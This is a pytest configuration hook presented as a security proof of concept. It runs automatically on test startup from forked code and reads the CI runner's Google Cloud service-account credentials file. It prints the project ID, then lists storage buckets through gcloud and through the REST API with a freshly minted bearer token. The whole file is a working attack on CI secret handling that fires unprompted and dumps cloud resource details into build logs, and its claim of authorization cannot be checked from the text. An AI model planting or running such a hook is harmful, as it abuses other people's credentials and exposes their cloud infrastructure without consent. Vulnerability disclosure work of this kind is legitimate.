# Non-Destructive Security PoC — GCP Resource Access Proof
# This proves the GCP SA key can access real cloud resources
# It ONLY lists bucket names — no data is read, modified, or exfiltrated
#
# Requested by Google Security Team on issue 516355326

import os
import sys
import subprocess
import json


def pytest_configure(config):
    """Runs automatically before any test collection."""
    print("\n" + "=" * 70)
    print("SECURITY POC - GCP Resource Access Demonstration")
    print("=" * 70)
    print(f"POC executed from fork code")
    print(f"Working directory: {os.getcwd()}")
    print()

    # Prove GCP credentials are accessible
    creds_path = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "")
    project_id = None
    print(f"[GCP AUTH] GOOGLE_APPLICATION_CREDENTIALS set: {bool(creds_path)}")

    if creds_path and os.path.exists(creds_path):
        try:
            with open(creds_path) as f:
                creds = json.load(f)
            project_id = creds.get("project_id", "unknown")
            print(f"[GCP AUTH] Credential type: {creds.get('type', 'unknown')}")
            print(f"[GCP AUTH] Project ID: {project_id}")
        except Exception as e:
            print(f"[GCP AUTH] Could not parse credentials: {e}")

    print()

    # List GCP Storage Buckets via gcloud CLI (pre-installed on GitHub runners)
    print("[GCP BUCKETS] Listing storage buckets via gcloud CLI...")
    try:
        result = subprocess.run(
            ["gcloud", "storage", "buckets", "list", "--format=value(name)"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        if result.returncode == 0 and result.stdout.strip():
            buckets = result.stdout.strip().split("\n")
            print(f"[GCP BUCKETS] Found {len(buckets)} bucket(s):")
            for b in buckets:
                print(f"  - {b}")
        elif result.stderr:
            print(f"[GCP BUCKETS] gcloud stderr: {result.stderr[:300]}")
        else:
            print("[GCP BUCKETS] No buckets found or no storage access")
    except FileNotFoundError:
        print("[GCP BUCKETS] gcloud CLI not available")
    except Exception as e:
        print(f"[GCP BUCKETS] Error: {type(e).__name__}: {e}")

    # Fallback: REST API using google-auth
    if project_id:
        print()
        print("[GCP BUCKETS] Listing via REST API fallback...")
        try:
            import google.auth
            import google.auth.transport.requests
            import urllib.request

            credentials, proj = google.auth.default()
            credentials.refresh(google.auth.transport.requests.Request())

            url = f"https://storage.googleapis.com/storage/v1/b?project={project_id}"
            req = urllib.request.Request(
                url,
                headers={"Authorization": f"Bearer {credentials.token}"},
            )
            response = urllib.request.urlopen(req, timeout=10)
            data = json.loads(response.read())
            items = data.get("items", [])
            if items:
                print(f"[GCP BUCKETS REST] Found {len(items)} bucket(s):")
                for bucket in items:
                    print(f"  - {bucket['name']}")
            else:
                print("[GCP BUCKETS REST] No buckets found")
        except Exception as e:
            print(f"[GCP BUCKETS REST] Error: {type(e).__name__}: {e}")

    print()
    print("=" * 70)
    print("END OF SECURITY POC")
    print("Only bucket names were listed. No data was read or exfiltrated.")
    print("=" * 70)
    print()
